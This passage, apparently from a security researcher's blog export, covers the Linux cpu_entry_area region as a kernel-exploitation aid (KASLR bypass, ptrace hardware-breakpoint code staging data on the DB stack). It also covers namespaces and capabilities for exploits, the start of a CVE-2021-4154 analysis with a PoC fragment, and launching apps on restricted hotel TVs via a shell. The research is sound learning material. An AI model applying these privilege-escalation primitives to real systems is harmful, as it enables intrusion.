WP（需扫码下载....](https://mp.weixin.qq.com/s?t=pages/image_detail&scene=1&__biz=MzU4MTg1NzAzMA==&mid=2247487802&idx=1&sn=a927dc538e48cf986bdc5d1aba800c0d#wechat_redirect)\n\n[VERITAS501 一篇详细分析cpu_entry_area区域的文章](https://veritas501.github.io/2023_03-22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/)\n\n[P0 本题利用方法的来源](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html)\n\n[硬件断点寄存器 x86 debug register](https://en.wikipedia.org/wiki/X86_debug_register)\n\n[硬件断点的原理](https://www.52pojie.cn/forum.php?mod=viewthread&tid=846934&extra=page%3D3%26filter%3Dauthor%26orderby%3Ddateline)\n\n[ptrace和waitpid搭配使用查看子进程状态](https://www.cnblogs.com/happybirthdaytoyou/p/14496476.html)\n\n\n\n\n\n","tags":["linux kernel","cpu_entry_area"],"categories":["CTF"]},{"title":"x64 Linux 虚拟内存分布图","url":"/2023/07/05/230705-linux-virtual-memory-map/","content":"\n\n\n前段时间做linux内核pwn时，碰到一个很有意思的虚拟内存区域 —— cpu_entry_area mapping（0xfffffe0000000000~ 0xfffffe7fffffffff）。这个区域未开启随机化，在利用时可以用来：\n\n1. 泄露内核代码段地址信息，绕过KASLR\n2. 地址空间有可写部分，rop等数据可以布置到该空间\n3. 0xfffffe0000010f58可作为栈迁移的目的地（DB exception stack），需结合硬件断点（hardware breakpoint）和DB异常（debug exception）\n\n这么强大的一个区域居然从来没关注过，来看看linux官方给出的[虚拟内存分布图](https://elixir.bootlin.com/linux/v5.10/source/Documentation/x86/x86_64/mm.rst)，会不会还存在一些尚未关注到的危险区域呢？\n\n![image-20230705003923041](image-20230705003923041.png?size=600)\n\n为了了解以上各区间存在的意义及其特性，新起这篇博客专门记录学习过程，一点点更新。\n\n# user-space virtual memory\n\n用户空间的虚拟内存空间，每个进程都有自己独立的内存空间，struct mm_struct\n\n\n\n# LDT remap for PTI\n\n\n\n# direct mapping of all physical memory\n\n\n\n# vmalloc/ioremap space\n\n\n\n# virtual memory map\n\n\n\n#  KASAN shadow memory\n\n\n\n# vaddr_end for KASLR\n\n\n\n# cpu_entry_area mapping\n\n区间：0xfffffe0000000000 ~ 0xfffffe7fffffffff\n\n大小：2 TB\n\n随机化：从linux 6.2开始，对cpu_entry_area做了随机化，早期版本无随机化。但未对idt区域随机化，因此，依然可以通过这个位置泄露内核地址。\n\n内容：存放IDT表和n个 [struct cpu_entry_area](https://elixir.bootlin.com/linux/v5.15.103/source/arch/x86/include/asm/cpu_entry_area.h#L90)结构体，每个cpu对应一个cpu_entry_area结构体。以linux5.15.119为例，结构体定义如下\n\n```c\nstruct cpu_entry_area {\n\tchar gdt[PAGE_SIZE];\n\t\n\tstruct entry_stack_page entry_stack_page;\n\t\n\tstruct tss_struct tss;\n\t\n#ifdef CONFIG_X86_64\n\t/*\n\t * Exception stacks used for IST entries with guard pages.\n\t */\n\tstruct cea_exception_stacks estacks;\n#endif\n\n\tstruct debug_store cpu_debug_store;\n\n\tstruct debug_store_buffers cpu_debug_buffers;\n};\n```\n\n可以看到，结构体中包含：\n\n- the GDT\n- the entry stack ：每个cpu有一个，用于处理用户态到内核的上下文切换。\n- the TSS\n- the exception stacks ：cpu处理某些中断和异常时会用到这里面的栈，一共有7种类型。对应到tss_struct结构体种的`tss->x86_tss.ist[7]`，即Interrupt Stack Table 中断栈表（IST）。\n- debug stores and buffers\n\n该结构体在整个mapping区域布局如下图所示（老版本内核的偏移跟这个不一样，DB_stack\\DF_stack等栈大小是0x1000）：\n\n![image-20230705155603586](image-20230705155603586.png?size=600)\n\n在漏洞利用中需要关注的是exception stacks中DB_stack这段，它是内核空间的地址，同时用户态也能将数据布置到上面。用户态通过ptrace为子进程设置硬件断点，并在子进程中触发该硬件断点，便能将此时子进程的寄存器内容压入DB_stack中。\n\n代码层面如何操作呢？如下代码可将用户态寄存器数据布置到cpu_entry_area的DB stack中\n\n```c\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/user.h>\n#include <stddef.h>\n#include <sys/wait.h>\n#include <sys/ptrace.h>\n#include <sched.h>\n\npid_t hbp_pid;\nint status;\nchar buf[0x10];\n\n// 创建hardware breakpoint\nvoid create_hbp(void* addr)     \n{\n    //Set DR0: HBP address\n    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg), addr) == -1) {\n        printf(\"Could not create hbp! ptrace dr0: %m\\n\");\n        kill(hbp_pid,9);\n        exit(1);\n    }\n    /* Set DR7: bit 0 enables DR0 breakpoint. Bit 8 ensures the processor stops on the instruction which causes the exception.\n     * bits 16,17 means we stop on data read or write. Bits 18,19 say we watch 4 bytes. Why 4 bytes? Well, it's convenient to\n     * hit 4 DB exceptions per syscall. Why not 8 bytes? Because 4 bytes works fine. */\n    if(ptrace(PTRACE_POKEUSER,hbp_pid, offsetof(struct user, u_debugreg) + 56, 0xf0101) == -1) {\n        printf(\"Could not create hbp! ptrace dr7: %m\\n\");\n        kill(hbp_pid,9);\n        exit(1);\n    }\n}\n\nint main(){\n\n    // 1. fork a child process\n    hbp_pid = fork();\n\n    // 2. child process\n    if(hbp_pid == 0){\n        /* bind cpu */\n        cpu_set_t mask;\n        CPU_ZERO(&mask);\n        CPU_SET(1,&mask);\n        sched_setaffinity(0,sizeof(mask),&mask);\n\n        ptrace(PTRACE_TRACEME,0,NULL,NULL);\n        raise(SIGSTOP);                         // 生成一个SIGSTOP信号，当前进程child停止运行\n\n        __asm__(\n            \"mov r15,   0x15151515;\"\n            \"mov r14,   0x14141414;\"\n            \"mov r13,   0x13131313;\" \n            \"mov r12,   0x12121212;\"\n            \"mov rbp,   0xeeeeeeee;\"\n            \"mov rbx,   0xbbbbbbbb;\"\n            \"mov r11,   0x11111111;\"\n            \"mov r10,   0x10101010;\"\n            \"mov r9,    0x99999999;\"\n            \"mov r8,    0x88888888;\"\n            \"mov rax,   0xaaaaaaaa;\"\n            \"mov rcx,   0xcccccccc;\"\n            \"mov rdx,   0xdddddddd;\"\n            \"mov rsi,   buf;\"\n            \"mov rdi,   [rsi];\"\n        );\n        exit(1);\n    }\n\n    // 3. father process\n    waitpid(hbp_pid,&status,0);           // 确定子进程中raise(SIGSTOP)已执行完毕\n\n    create_hbp(buf);\n\n    ptrace(PTRACE_CONT,hbp_pid,0,0);            \n    waitpid(hbp_pid,&status,0);           // 确定子进程触发到了硬件断点，进入trap\n\n    ptrace(PTRACE_CONT,hbp_pid,0,0);\n    waitpid(hbp_pid,&status,0);           // 确定子进程已退出执行，这个PTRACE_CONT和waitpid可以省略。进入trap后，寄存器信息已带入cpu_entry_area的DB stack中\n\n    // 4. enter kernel, get data\n\n    return 0;\n}\n```\n\n以上程序执行完毕后，调试查看内核信息，成功将用户态数据放入DB stack\n\n![image-20230705192354954](image-20230705192354954.png?size=600)\n\n\n\n参考：\n\n[P0: Exploiting CVE-2022-42703 - Bringing back the stack attack](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html)\n\n[pray77: 跟cpu_entry_area相关的一个题 - sycrop和sycrpg](https://github.com/pray77/SCTF2023_kernelpwn)\n\n[veritas501: 一种借助硬件断点的提权思路分析与演示](https://veritas501.github.io/2023_03-22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/)\n\n[sholck: cea区域前0x1000空间映射到 IDT table](http://sholck.top/archives/20.html)\n\n[stackexchange - what is cpu_entry_area?](https://unix.stackexchange.com/a/476777)\n\n[Kernel stacks on x86-64 bit](https://www.kernel.org/doc/Documentation/x86/kernel-stacks)\n\n\n\n# %esp fixup stacks\n\n\n\n# EFI region mapping space\n\n\n\n# kernel text mapping\n\nmapped to physical address 0\n\n\n\n# module mapping space\n\n\n\n# kernel-internal fixmap range,\n\nvariable size and offset\n\n\n\n# legacy vsyscall ABI\n\n","tags":["linux","memory management"],"categories":["未分类"]},{"title":"电视端常用视频app包名和MainActivity名整理","url":"/2023/06/19/230619-android-apk/","content":"\n\n\n\n\n# 视频app包名和MainActivity名整理\n\n有些酒店的电视做了限制，无法随意打开视频应用。所以在拿到电视shell后，安装任意视频app，然后通过如下命令启动任意视频app：\n\n```\nam start -n 包名/MainActivity名\n```\n\n常见的电视TV客户端的包名和MainActivity名总结如下：\n\n- 爱奇艺的[奇异果TV](https://app.iqiyi.com/lequ/20230614/qiyiguo_official13.6.0.apk)\n\n  ```\n  com.gitvdemo.video/com.gala.video.app.epg.HomeActivity\n  ```\n\n- 腾讯的[极光TV](https://5d240effc566de12f293085b41fcc9b8.dlied1.cdntips.net/dldir1.qq.com/qqmi/kt/snm/video2/202306062248309597_tv_video_12.2.0.1016_android_16118.apk?mkey=64904b082a651aa5&f=0000&cip=42.101.60.80&proto=https)\n\n  ```\n  com.ktcp.video/com.ktcp.video.activity.MainActivity\n  ```\n\n- 优酷的[酷喵TV](https://gtvappstore.alicdn.com/tvapp3/coolmiao/10013564_CIBN_CoolMiao_guanfangtongyong_11.2.1.2-release.apk)\n\n  ```\n  com.cibn.tv/com.youku.tv.home.activity.HomeActivity\n  ```\n\n- bilibili的[iBiliTV](https://dl.hdslb.com/mobile/latest/android_tv_yst/iBiliTV-master.apk?t=20230619&spm_id_from=333.47.b_646f776e6c6f61642d6c696e6b.5)\n\n  ```\n  com.xiaodianshi.tv.yst/com.xiaodianshi.tv.yst.ui.main.MainActivity\n  ```\n\n- 芒果的[芒果TV](https://webapk.dangbei.net/down/20230609/mgtvDBEI_6.2.401_dangbei.apk)\n\n  ```\n  com.starcor.mango/com.mgtv.tv.launcher.ChannelHomeActivity\n  ```\n\n\n\n# 获取app包名和activity名的脚本\n\n如下python脚本可以提取任意app的包名和MainActivity名，本质是解析`AndroidManifest.xml`中的字段。\n\n```python\n# python ./search_app.py appname.apk\nimport os\nimport sys\nimport shutil\nfrom xml.dom.minidom import parse\nimport xml.dom.minidom\n\ndef main(argv):\n    out_dir = \"./apktool_result\"\n    manifest_path = out_dir + \"/AndroidManifest.xml\"\n\n    # apktool unpack\n    get_manifest = \"apktool.bat d \" + argv[1] + \" -o \" + out_dir\n    os.system(get_manifest)\n\n    # xml parse\n    DOMTree = xml.dom.minidom.parse(manifest_path)\n    collection = DOMTree.documentElement\n\n    str1 = collection.getAttribute(\"package\")\n\n    activity = collection.getElementsByTagName(\"activity\")\n    for a in activity:\n        intent_filter = a.getElementsByTagName(\"intent-filter\")\n        for i in intent_filter:\n            action = i.getElementsByTagName(\"action\")\n            for ac in action:\n                ac_name = ac.getAttribute(\"android:name\")\n                if ac_name == \"android.intent.action.MAIN\":\n                    str2 = a.getAttribute(\"android:name\") \n                    print(\"****************************************************\")\n                    print(\"%s/%s\" % (str1,str2))\n                    print(\"****************************************************\")\n                    print(\"deleting files,please wait...\")\n                    shutil.rmtree(out_dir)\n                    exit(0)\n\nif __name__ == '__main__':\n    main(sys.argv)\n```\n\n\n\n\n\n","categories":["未分类"]},{"title":"linux namespace、cgroup 及 capabilities","url":"/2023/05/23/230523-cgroup-namespace/","content":"\n\n做内核漏洞利用的时候，经常需要用到切换namespace的操作。比如普通用户执行`syscall(__NR_fsopen, \"cgroup\", 0);`时会报错“Operation not permitted”，而使用`unshare`创建一个新的namespace后便可以成功执行。\n\n一直不明白它背后的原理，于是抽空了解一下namespace和cgroup。\n\nnamespace和cgroup都是linux内核的特性，可以用它们来实现容器，现在最常用的docker就是基于它们的。\n\n# cgroup\n\ncgroup（control group）是linux内核的一个特性，它可以用于限制、计算、隔离进程组对计算机资源的使用（如CPU、memory、disk I/O、network等）。\n\ncgroup有如下四个功能：\n\n1. 资源限制（Resource limits）：限制进程组对某一特定资源（CPU，disk，或network）的使用量\n2. 优先级（Prioritization）：通过给某个cgroup中的进程分配多一些资源（相比于其他cgroup），从而提高优先级\n3. 审计（Accounting）：记录进程/进程组使用的资源量\n4. 控制（Control）：进程组控制，如可以使用freezer将进程组挂起或恢复\n\ncgroup是容器（containers）的一个重要组成部分，因为容器中通常会运行多个进程，这些进程通常需要一并控制。\n\n[Understanding cgroups](https://www.grant.pizza/blog/understanding-cgroups/)以 cpu cgroup为例，展示了如何设置cgroup。总结如下：\n\n```bash\n$ cat /proc/156009/cgroup \t\t\t# 查看进程所属cgroup\n13:rdma:/\n12:pids:/user.slice/user-1000.slice/user@1000.service\n11:misc:/\n10:freezer:/\n9:devices:/user.slice\n8:perf_event:/\n7:blkio:/user.slice\n6:cpuset:/\n5:net_cls,net_prio:/\n4:cpu,cpuacct:/user.slice\n3:hugetlb:/\n2:memory:/user.slice/user-1000.slice/user@1000.service\n1:name=systemd:/user.slice/user-1000.slice/user@1000.service/apps.slice/apps-org.gnome.Terminal.slice/vte-spawn-22435931-24c6-4399-b2b0-31b0335ff349.scope\n0::/user.slice/user-1000.slice/user@1000.service/apps.slice/apps-org.gnome.Terminal.slice/vte-spawn-22435931-24c6-4399-b2b0-31b0335ff349.scope\n\n$ ls -al /sys/fs/cgroup\t\t# 查看cgroup文件系统，目录下每个目录代表一个cgroup类型。每一个cgroup类都遵循层级结构\ntotal 0\ndrwxr-xr-x 16 root root 400 4月  30 05:48 .\ndrwxr-xr-x 11 root root   0 4月  30 05:48 ..\ndr-xr-xr-x  6 root root   0 4月  30 05:48 blkio\t\t\t# 限制进程的块设备io\nlrwxrwxrwx  1 root root  11 4月  30 05:48 cpu -> cpu,cpuacct\t\t# 限制进程的cpu使用率\nlrwxrwxrwx  1 root root  11 4月  30 05:48 cpuacct -> cpu,cpuacct\t\t\ndr-xr-xr-x  6 root root   0 4月  30 05:48 cpu,cpuacct\t\ndr-xr-xr-x  3 root root   0 4月  30 05:48 cpuset\ndr-xr-xr-x  7 root root   0 4月  30 05:48 devices\t\t# 控制进程能够访问某些设备\ndr-xr-xr-x  4 root root   0 4月  30 05:48 freezer\t\t# 挂起或恢复cgroups中的进程\ndr-xr-xr-x  3 root root   0 4月  30 05:48 hugetlb\ndr-xr-xr-x  6 root root   0 4月  30 05:48 memory\t\t\t# 限制进程的内存使用量\ndr-xr-xr-x  2 root root   0 4月  30 05:48 misc\nlrwxrwxrwx  1 root root  16 4月  30 05:48 net_cls -> net_cls,net_prio\t# 标记cgroups中进程的网络数据包\ndr-xr-xr-x  3 root root   0 4月  30 05:48 net_cls,net_prio\nlrwxrwxrwx  1 root root  16 4月  30 05:48 net_prio -> net_cls,net_prio\ndr-xr-xr-x  3 root root   0 4月  30 05:48 perf_event\ndr-xr-xr-x  6 root root   0 4月  30 05:48 pids\ndr-xr-xr-x  3 root root   0 4月  30 05:48 rdma\ndr-xr-xr-x  6 root root   0 4月  30 05:48 systemd\ndr-xr-xr-x  6 root root   0 5月   1 21:31 unified\n\n$ cd cpu\t\t\n$ ls -al\t\t\t# /sys/fs/cgroup/cpu目录下（相当于根cgroup），存放着进程约束配置文件，及子cgroup（如docker，user.slice等，在子cgroup中还可以继续创建子cgroup。子cgroup能占用的资源不大于父级cgroup）\ntotal 0\ndr-xr-xr-x   6 root root   0 4月  30 05:48 .\ndrwxr-xr-x  16 root root 400 4月  30 05:48 ..\n-rw-r--r--   1 root root   0 5月  21 12:58 cgroup.clone_children\n-rw-r--r--   1 root root   0 4月  30 05:48 cgroup.procs\n-r--r--r--   1 root root   0 5月  21 12:58 cgroup.sane_behavior\n-r--r--r--   1 root root   0 5月  21 12:58 cpuacct.stat\n-rw-r--r--   1 root root   0 5月  21 12:58 cpuacct.usage\n-r--r--r--   1 root root   0 5月  21 12:58 cpuacct.usage_all\n-r--r--r--   1 root root   0 5月  21 12:58 cpuacct.usage_percpu\n-r--r--r--   1 root root   0 5月  21 12:58 cpuacct.usage_percpu_sys\n-r--r--r--   1 root root   0 5月  21 12:58 cpuacct.usage_percpu_user\n-r--r--r--   1 root root   0 5月  21 12:58 cpuacct.usage_sys\n-r--r--r--   1 root root   0 5月  21 12:58 cpuacct.usage_user\n-rw-r--r--   1 root root   0 5月  21 12:58 cpu.cfs_burst_us\n-rw-r--r--   1 root root   0 5月  21 12:58 cpu.cfs_period_us\n-rw-r--r--   1 root root   0 4月  30 05:48 cpu.cfs_quota_us\n-rw-r--r--   1 root root   0 5月  21 12:58 cpu.idle\n-rw-r--r--   1 root root   0 4月  30 05:48 cpu.shares\n-r--r--r--   1 root root   0 5月  21 12:58 cpu.stat\ndrwxr-xr-x   3 root root   0 5月   1 21:31 docker\ndrwxr-xr-x   2 root root   0 5月   4 18:55 init.scope\n-rw-r--r--   1 root root   0 5月  21 12:58 notify_on_release\n-rw-r--r--   1 root root   0 5月  21 12:58 release_agent\ndrwxr-xr-x 116 root root   0 4月  30 05:48 system.slice\n-rw-r--r--   1 root root   0 5月  21 12:58 tasks\ndrwxr-xr-x   2 root root   0 4月  30 05:48 user.slice\n\n$ cat tasks\t\t\t\t# 查看当前层级cgroup中包含的进程号\n\n$ sudo mkdir cgroup_test\t\t\t# 使用mkdir就可以创建一个子级cgroup\n$ cd cgroup_test\n$ sudo echo 1234 > tasks\t\t\t# 添加1234号进程到新创建的cgroup中\n$ cd ../\n$ sudo rmdir cgroup_test\t\t\t# 删除创建的cgroup\n```\n\n关于cgroup里的一些概念，可以参考：[Cgroup是什么(相关概念、功能、作用、特点、怎么用）](https://blog.csdn.net/chen_haoren/article/details/108773459)\n\n\n\n# namespace\n\nnamespace也是linux内核的一个特性，它将内核资源分隔开，一组进程能看到一些资源，而其他组的进程看到的是不同的资源，组与组之间互不干扰，不知道对方的存在。简单来说，namespace就是内核提供的一种进程间资源隔离技术。\n\n查看进程的namespace信息：\n\n```bash\n$ ls -al /proc/$$/ns        \t\ntotal 0\ndr-x--x--x 2 bling bling 0 5月  22 21:19 .\ndr-xr-xr-x 9 bling bling 0 5月  22 16:22 ..\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 cgroup -> 'cgroup:[4026531835]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 ipc -> 'ipc:[4026531839]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 mnt -> 'mnt:[4026531841]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 net -> 'net:[4026531840]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 pid -> 'pid:[4026531836]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 pid_for_children -> 'pid:[4026531836]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 time -> 'time:[4026531834]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 time_for_children -> 'time:[4026531834]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 user -> 'user:[4026531837]'\nlrwxrwxrwx 1 bling bling 0 5月  22 23:14 uts -> 'uts:[4026531838]'\n\n```\n\n以上是ubuntu20.04中的一个namespace示例，一共有8类：\n\n| namespace名称 | 使用时的flag    | 意义                                                         | 编译选项       |\n| ------------- | --------------- | ------------------------------------------------------------ | -------------- |\n| IPC           | CLONE_NEWIPC    | System V IPC, POSIX message queues信号量，消息队列           | CONFIG_IPC_NS  |\n| Network       | CLONE_NEWNET    | Network devices, stacks, ports, etc.网络设备，协议栈，端口等等 | CONFIG_NET_NS  |\n| Mount         | CLONE_NEWNS     | Mount points挂载点                                           |                |\n| PID           | CLONE_NEWPID    | Process IDs进程号                                            | CONFIG_PID_NS  |\n| Time          | CLONE_NEWTIME   | 时钟                                                         | CONFIG_TIME_NS |\n| User          | CLONE_NEWUSER   | 用户和组 ID                                                  | CONFIG_USER_NS |\n| UTS           | CLONE_NEWUTS    | 系统主机名和 NIS(Network Information Service) 主机名（有时称为域名） | CONFIG_UTS_NS  |\n| Cgroup        | CLONE_NEWCGROUP | Cgroup root directory cgroup 根目录                          |                |\n\n如何使用？跟namespace相关的系统调用有三个：\n\n1. clone：创建新的进程并设置namespace\n\n   ```c\n   #include <sched.h>\n   \n   int clone(int (*fn)(void *), void *child_stack,\n            int flags, void *arg, ...\n            /* pid_t *ptid, struct user_desc *tls, pid_t *ctid */ );\n   \n   // 使用示例：\n   int pid = clone(childFunc, stackTop, CLONE_NEWPID | SIGCHLD, \"child\");\n   ```\n\n   \n\n2. unshare：让当前进程加入新的namespace\n\n   ```c\n   int unshare(int flags);\n   \n   // 使用示例：\n   unshare(CLONE_NEWPID);\n   ```\n\n   linux命令也有一个unshare，可以直接使用如下命令创建一个namespace。新的user，pid，map成root用户，并mount一个新的proc文件系统\n\n   ```bash\n   unshare --user --pid --map-root-user --mount-proc --fork bash\n   ```\n\n   \n\n3. setns：让进程加入已经存在 namespace\n\n   ```c\n   int setns(int fd, int nstype);\n   \n   // 使用示例\n   fd = open(\"/proc/12425/ns/pid\", O_RDONLY);  \n   setns(fd, CLONE_NEWPID);\n   ```\n\n\n\n参考文章：\n\n[搞懂容器技术的基石： namespace （上）](https://moelove.info/2021/12/10/%E6%90%9E%E6%87%82%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF%E7%9A%84%E5%9F%BA%E7%9F%B3-namespace-%E4%B8%8A/)\n\n[docker 容器基础技术：linux namespace 简介](https://cizixs.com/2017/08/29/linux-namespace/)\n\n更深入的理解：\n\n[Digging into Linux namespaces - part 1](https://blog.quarkslab.com/digging-into-linux-namespaces-part-1.html)\n\n[A deep dive into Linux namespaces](https://ifeanyi.co/posts/linux-namespaces-part-1/)\n\n[A deep dive into Linux namespaces, part 2](https://ifeanyi.co/posts/linux-namespaces-part-2/)\n\n\n\n## 通过namespace判断当前是否在容器中\n\ndocker逃逸时，exp可能需要判断当前是否还在容器中，可以通过`/proc/1/ns/pid`来判断。\n\n```c\n#include <stdio.h>\n\nint main(){\n    char buffer[0x100];\n\tint re = readlink(\"/proc/1/ns/pid\", buffer, 0x100);\n    buffer[re] = 0;\n    printf(\"buffer:%s\\n\",buffer);\n\tif (strcmp(buffer, \"pid:[4026531836]\") != 0) {\n        printf(\"we are in docker\\n\");\n        return -1;\n    }\n    printf(\"we are in ubuntu\\n\");\n    return 0\n}\n\n// gcc test.c -o test\n// sudo ./test\n```\n\n# capabilities\n\ncapabilities是linux系统上比\"特权/非特权用户\"更细粒度的访问控制机制。\n\n可执行程序的capabilities有三个集合，用来保存三类capabilities：\n\n1. Permitted\n2. Inheritable\n3. Effective\n\n```bash\ngetcap /bin/ping\t# 查看可执行程序的capabilities\nsudo setcap cap_net_admin,cap_net_raw+ep /bin/ping\t\t# 给程序设置capabilities\nsudo setcap cap_net_admin,cap_net_raw-ep /bin/ping\t\t# 移除程序的capabilities\n```\n\n进程的capabilities有五种集合，：\n\n1. Permitted：进程能够使用的capabilities的上限\n2. Inheritable：创建子进程时会将Inherited capabilities传递下去\n3. Effective：当前进程执行过程中用到的capabilities，内核检查进程是否可以进行特权操作时，就检查该集合\n4. Bounding：\n5. Ambient：\n\n通过查看`/proc/[pid]/status`可以获得进程五个capabilities集合的信息：\n\n```bash\n➜  ~ echo $$\n152301\n➜  ~ cat /proc/152301/status\n# ......\nCapInh:\t0000000000000000\nCapPrm:\t0000000000000000\nCapEff:\t0000000000000000\nCapBnd:\t000001ffffffffff\t\t# 无法阅读，可通过capsh --decode=xxx来解析，如下示例\nCapAmb:\t0000000000000000\n# ......\n➜  ~ capsh --decode=000001ffffffffff \n0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40\n\n# 其他操作命令\ncapsh --print\t\t# 查看当前shell进程的capabilities\ngetpcaps 1234\t\t# 获取进程号为1234的进程的capabilities\n```\n\n相关系统调用：sys_capget，sys_capset\n\n\n\n参考：\n\n[Linux Capabilities 简介](https://www.cnblogs.com/sparkdev/p/11417781.html)\n\n[An Introduction to Linux Capabilities](https://earthly.dev/blog/intro-to-linux-capabilities/)\n\n[Linux Capabilities: Why They Exist and How They Work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)\n\n[Capabiltiy 示例](https://0x0916.gitbooks.io/linux-capability/content/example.html)\n\n\n\n# 回到问题\n\n看完cgroup和namespace并未解决我一开始的问题。cgroup是控制cpu和内存等资源的，跟能否通过fsopen打开cgroup应该无关。而namespace无论切换到root还是普通用户都能打开cgroup，那为什么正常shell下的普通用户无法打开cgroup呢？\n\n于是看了下linux的capabilities！\n\nlinux中除了通过user（特权进程/非特权进程）限制权限，还有更细粒度的capabilities。执行一个操作时，当user权限未通过，还会检测进程是否具备对应的capabilities。\n\n所以有了一个猜测：通过unshare设置当前进程namespace的时候，它一定有了新的capabilities！\n\n通过以下程序可以证明，执行unshare后，当前进程就有了所有的linux capabilities，所以可以成功执行`syscall(__NR_fsopen, \"cgroup\", 0);`\n\n```c\n// gcc test.c -lcap -o test\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <stdarg.h>\n#include <unistd.h>\n#include <pthread.h>\n#include <sys/types.h>\n#undef _POSIX_SOURCE  \n#include <sys/capability.h>\n\nstatic void die(const char *fmt, ...) {\n  va_list params;\n  va_start(params, fmt);\n  vfprintf(stderr, fmt, params);\n  va_end(params);\n  exit(1);\n}\n\nint main(){\n    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {\n        die(\"unshare(CLONE_NEWUSER | CLONE_NEWNS): %m\");\n    }\n\n    if (unshare(CLONE_NEWNET)) {\n        die(\"unshare(CLONE_NEWNET): %m\");\n    }\n\n    cap_t caps = cap_get_proc(); \n    ssize_t y = 0;  \n    printf(\"The process %d was give capabilities %s\\n\",(int) getpid(), cap_to_text(caps, &y));  \n\n    struct __user_cap_header_struct cap_header_data;\n    cap_user_header_t cap_header = &cap_header_data;\n\n    struct __user_cap_data_struct cap_data_data;\n    cap_user_data_t cap_data = &cap_data_data;\n\n    cap_header->pid = getpid();\n    cap_header->version = _LINUX_CAPABILITY_VERSION_1;\n\n    if (capget(cap_header, cap_data) < 0) {\n        perror(\"Failed capget\");\n        exit(1);\n    }\n    printf(\"Cap data CapEff: 0x%x, CapPrm: 0x%x, CapInh: 0x%x \\n\",cap_data->effective, cap_data->permitted, cap_data->inheritable);\n\n    return 0;\n}   \n\n/*\n执行后输出\n➜  ~ ./test                  \nThe process 162247 was give capabilities =ep\nCap data CapEff: 0xffffffff, CapPrm: 0xffffffff, CapInh: 0x0 \n*/\n```\n\n[cap_get_proc(3)](https://man7.org/linux/man-pages/man3/cap_set_proc.3.html)\n\n[capget(2)](https://man7.org/linux/man-pages/man2/capset.2.html)\n\n\n\n# 参考文章\n\n[linux中的容器与沙箱初探](https://atum.li/2017/04/25/linuxsandbox/)\n\n[What Are Namespaces and cgroups, and How Do They Work?](https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/)\n\n","tags":["namespace","cgroup","capabilities"],"categories":["未分类"]},{"title":"CVE-2021-4154 漏洞分析及利用","url":"/2023/05/19/230518-cve-2021-4154/","content":"\n\n\nDritycred利用示例中的第一个漏洞 - CVE-2021-4154，相关ppt、论文、源码如下：\n\n[BlackHat USA 2022 - Cautious! A New Exploitation Method! No Pipe but as Nasty as Dirty Pipe](https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf)\n\n[论文 - DirtyCred: Escalating Privilege in Linux Kernel](https://zplin.me/papers/DirtyCred.pdf)\n\n[github - Markakd/DirtyCred](https://github.com/Markakd/DirtyCred)\n\n针对该漏洞，除了Dritycred利用方法，还可以通过cross-cache常规方法来做（过程更复杂）。\n\n# 漏洞分析\n\n漏洞点信息：[cgroup: verify that source is a string](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3b0462726e7ef281c35a7a4ae33e93ee2bc9975b)\n\n漏洞修复patch如下：\n\n```diff\ndiff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c\nindex ee93b6e895874..527917c0b30be 100644\n--- a/kernel/cgroup/cgroup-v1.c\n+++ b/kernel/cgroup/cgroup-v1.c\n@@ -912,6 +912,8 @@ int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)\n \topt = fs_parse(fc, cgroup1_fs_parameters, param, &result);\n \tif (opt == -ENOPARAM) {\n \t\tif (strcmp(param->key, \"source\") == 0) {\n+\t\t\tif (param->type != fs_value_is_string)\n+\t\t\t\treturn invalf(fc, \"Non-string source\");\n \t\t\tif (fc->source)\n \t\t\t\treturn invalf(fc, \"Multiple sources not supported\");\n \t\t\tfc->source = param->string;\n```\n\npoc代码片段如下\n\n```c\n    int fscontext_fd = fsopen(\"cgroup\");\n    int fd_null = open(\"/dev/null, O_RDONLY);\n    int fsconfig(fscontext_fd, FSCONFIG_SET_FD, \"source\", fd_null);\n    close_range(3, ~0U, 0);\t\t\t// close(fscontext_fd)时fd_null对应的struct 